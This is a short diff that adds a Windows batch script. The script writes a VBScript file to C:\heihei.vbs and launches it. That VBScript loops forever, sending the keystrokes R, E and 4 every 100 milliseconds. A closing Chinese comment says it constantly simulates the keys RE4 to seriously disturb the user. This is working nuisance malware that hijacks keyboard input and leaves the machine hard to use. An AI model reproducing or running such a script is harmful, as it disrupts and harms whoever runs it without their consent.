@@ -1,0 +1,13 @@
+11
+del /f /q "C:\heihei.vbs"
+echo Dim^ ws >>C:/heihei.vbs
+echo set^ ws^=CreateObject^ ^(^"WSCript^.shell^"^) >>C:/heihei.vbs
+echo do >>C:/heihei.vbs
+echo wscript^.sleep^ 100 >>C:/heihei.vbs
+echo ws^.SendKeys^ ^"R^" >>C:/heihei.vbs
+echo ws^.SendKeys^ ^"E^" >>C:/heihei.vbs
+echo ws^.SendKeys^ ^"4^" >>C:/heihei.vbs
+echo loop >>C:/heihei.vbs
+start c:/heihei.vbs
+exit
+//此脚本会不断模拟按键RE4，对用户造成严重干扰
